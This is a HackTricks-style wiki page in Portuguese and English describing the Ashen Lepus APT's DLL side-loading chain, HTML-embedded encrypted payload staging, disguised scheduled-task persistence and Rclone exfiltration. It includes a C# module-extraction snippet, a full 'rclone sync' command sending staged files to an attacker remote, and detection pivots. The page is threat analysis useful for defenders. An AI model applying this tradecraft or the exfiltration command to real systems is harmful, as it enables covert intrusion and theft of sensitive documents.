# Avançado DLL Side-Loading com HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) operacionalizou um padrão repetível que encadeia DLL sideloading, staged HTML payloads e backdoors modulares .NET para persistir em redes diplomáticas do Oriente Médio. A técnica é reutilizável por qualquer operador porque baseia-se em:

- **Archive-based social engineering**: PDFs benignos instruem as vítimas a baixar um arquivo RAR de um site de compartilhamento. O arquivo contém um visualizador de documentos EXE com aparência legítima, uma DLL maliciosa nomeada como uma biblioteca confiável (ex.: `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) e um `Document.pdf` isca.
- **DLL search order abuse**: a vítima clica duas vezes no EXE, o Windows resolve a importação da DLL a partir do diretório atual, e o loader malicioso (AshenLoader) executa dentro do processo confiável enquanto o PDF isca é aberto para evitar suspeitas.
- **Living-off-the-land staging**: cada estágio posterior (AshenStager → AshenOrchestrator → modules) é mantido fora do disco até ser necessário, entregue como blobs criptografados ocultos dentro de respostas HTML aparentemente inocentes.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: o EXE faz side-load do AshenLoader, que realiza recon do host, encripta-o com AES-CTR e o envia via POST dentro de parâmetros rotativos como `token=`, `id=`, `q=` ou `auth=` para caminhos que parecem API (ex.: `/api/v2/account`).
2. **HTML extraction**: o C2 só revela o próximo estágio quando o IP do cliente geolocaliza para a região alvo e o `User-Agent` condiz com o implant, frustrando sandboxes. Quando as checagens passam, o corpo HTTP contém um blob `<headerp>...</headerp>` com o AshenStager encriptado em Base64/AES-CTR.
3. **Second sideload**: o AshenStager é implantado com outro binário legítimo que importa `wtsapi32.dll`. A cópia maliciosa injetada no binário busca mais HTML, desta vez escavando `<article>...</article>` para recuperar o AshenOrchestrator.
4. **AshenOrchestrator**: um controlador modular .NET que decodifica uma config JSON em Base64. Os campos `tg` e `au` da config são concatenados/hasheados na chave AES, que desencripta `xrk`. Os bytes resultantes atuam como chave XOR para cada blob de módulo buscado posteriormente.
5. **Module delivery**: cada módulo é descrito através de comentários HTML que redirecionam o parser para uma tag arbitrária, quebrando regras estáticas que procuram somente por `<headerp>` ou `<article>`. Os módulos incluem persistência (`PR*`), uninstallers (`UN*`), reconhecimento (`SN`), captura de tela (`SCT`) e exploração de arquivos (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Mesmo se os defensores bloquearem ou removerem um elemento específico, o operador só precisa alterar a tag indicada no comentário HTML para retomar a entrega.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: current loaders embed 256-bit keys plus nonces (e.g., `{9a 20 51 98 ...}`) and optionally add an XOR layer using strings such as `msasn1.dll` before/after decryption.
- **Recon smuggling**: enumerated data now includes Program Files listings to spot high-value apps and is always encrypted before it leaves the host.
- **URI churn**: query parameters and REST paths rotate between campaigns (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidating brittle detections.
- **Gated delivery**: servers are geo-fenced and only answer real implants. Unapproved clients receive unsuspicious HTML.

## Persistence & Execution Loop

AshenStager drops scheduled tasks that masquerade as Windows maintenance jobs and execute via `svchost.exe`, e.g.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

These tasks relaunch the sideloading chain on boot or at intervals, ensuring AshenOrchestrator can request fresh modules without touching disk again.

## Using Benign Sync Clients for Exfiltration

Operators stage diplomatic documents inside `C:\Users\Public` (world-readable and non-suspicious) through a dedicated module, then download the legitimate [Rclone](https://rclone.org/) binary to synchronize that directory with attacker storage:

1. **Stage**: copy/collect target files into `C:\Users\Public\{campaign}\`.
2. **Configure**: ship an Rclone config pointing at an attacker-controlled HTTPS endpoint (e.g., `api.technology-system[.]com`).
3. **Sync**: run `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` so the traffic resembles normal cloud backups.

Because Rclone is widely used for legitimate backup workflows, defenders must focus on anomalous executions (new binaries, odd remotes, or sudden syncing of `C:\Users\Public`).

## Detection Pivots

- Alert on **signed processes** that unexpectedly load DLLs from user-writable paths (Procmon filters + `Get-ProcessMitigation -Module`), especially when the DLL names overlap with `netutils`, `srvcli`, `dwampi`, or `wtsapi32`.
- Inspect suspicious HTTPS responses for **large Base64 blobs embedded inside unusual tags** or guarded by `<!-- TAG: <xyz> -->` comments.
- Hunt for **scheduled tasks** that run `svchost.exe` with non-service arguments or point back to dropper directories.
- Monitor for **Rclone** binaries appearing outside IT-managed locations, new `rclone.conf` files, or sync jobs pulling from staging directories like `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)

{{#include ../../../banners/hacktricks-training.md}}
